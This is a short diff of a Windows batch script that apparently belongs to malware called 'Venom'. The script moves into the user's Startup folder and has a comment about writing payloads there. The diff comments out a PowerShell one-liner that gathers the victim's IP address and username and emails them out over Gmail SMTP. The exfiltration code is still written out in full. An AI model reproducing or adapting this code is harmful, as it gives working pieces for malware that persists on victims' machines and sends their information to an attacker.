@@ -9,7 +9,7 @@ set "STARTUP=C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Pr
 cd %STARTUP%
 
 @REM setup smtp
-powershell $email = "example@gmail.com"; password = "password"; $ip = (Get-NetIPAddress -AddressNetFamily IPV4 -InterfaceAlias Ethernet).IPAddress | Out-String; $subject = "Venom: $env:UserName ip"; $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587"); $smtp.EnableSSL = $true; $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password); $smtp.Send($email, $email, $subject, $ip);
+@rem powershell $email = "example@gmail.com"; password = "password"; $ip = (Get-NetIPAddress -AddressNetFamily IPV4 -InterfaceAlias Ethernet).IPAddress | Out-String; $subject = "Venom: $env:UserName ip"; $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587"); $smtp.EnableSSL = $true; $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password); $smtp.Send($email, $email, $subject, $ip);
 
 
 @REM write payloads to startup
